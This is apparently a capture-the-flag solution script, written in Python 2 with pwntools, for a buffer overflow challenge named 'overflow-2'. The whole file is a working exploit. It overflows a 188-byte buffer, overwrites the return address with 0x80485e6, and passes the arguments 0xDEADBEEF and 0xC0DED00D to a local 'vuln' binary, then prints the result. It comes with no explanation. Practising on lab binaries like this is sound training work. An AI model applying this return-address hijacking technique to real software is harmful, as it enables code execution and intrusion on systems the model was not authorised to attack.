from pwn import *


# p = process('/problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc/vuln')
p = process('./vuln')

p.sendline('A'*188 + p32(0x80485e6) + 'a'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))
print p.recvall()

# print('A'*188 + p32(0x80485e6) + p32(0xDEADBEEF) + p32(0xC0DED00D))
# p.interactive()
